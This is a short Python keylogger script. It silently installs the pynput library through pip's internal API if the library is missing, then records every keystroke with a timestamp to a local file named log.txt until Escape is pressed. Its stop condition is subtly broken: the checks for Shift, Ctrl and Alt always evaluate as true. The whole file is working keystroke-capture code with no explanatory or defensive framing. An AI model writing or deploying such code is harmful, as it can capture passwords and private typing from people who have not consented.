try:
	from pynput.keyboard import Key, Listener;
except ImportError:
	from pip._internal import main as pip;
	pip(['install', 'pynput']);
	from pynput.keyboard import Key, Listener;
	

import logging

logging.basicConfig(filename=("log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s', datefmt='%d-%b-%y %H:%M:%S');

def on_press(key):
	logging.info(str(key));
	if key == Key.esc and Key.shift and Key.ctrl and Key.alt:
		return False;

with Listener(on_press=on_press) as listener:
	listener.join();
